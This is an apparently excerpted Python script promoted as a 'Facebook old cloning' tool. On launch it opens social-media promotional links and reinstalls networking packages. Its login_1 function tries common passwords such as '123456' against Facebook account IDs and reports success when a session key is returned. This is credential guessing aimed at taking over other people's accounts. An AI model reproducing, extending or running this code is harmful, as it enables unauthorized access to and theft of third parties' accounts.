...
os.system('clear')
print(' \x1b[38;5;46mFb Id Giveaways grp join and more tricks ')
os.system('xdg-open https://www.facebook.com/groups/2202015640/?ref=share&mibextid=WaXdOe')
os.system('xdg-open https://chat.whatsapp.com/Ile1YTKBCiLCzqklEPK2eR?mode=ems_copy_c')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
os.system('xdg-open https://youtube.com/@yeitechmonto?si=G1Q38YNVbRjAlXC_')
...
os.system('xdg-open https://www.youtube.com/@Rizwanali46718')
...
{C}| {G}BESTU   {W}: ITZ CHUZA🐥 RIZWAN💥 AMNA S9RD9RNIIW👩 MUZIB😎
{C}| {G}VERSION {W}: 4.5
{C}| {G}TOOLS   {W}: FACEBOOK OLD CLONING
{C}| {G}STATUS  {W}: "CONTINUE FREE APPROVAL 🌝 FOR THE LAST 6 MONTHS ENJOY ALL USER🔥"
...
def login_1(uid):
    ...
    try:
        ...
        year = creationyear(uid)  # Tumhara function
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                ...
                print(f"\r\033[1;97m[ARNOLD-OK]\x1b[0m")
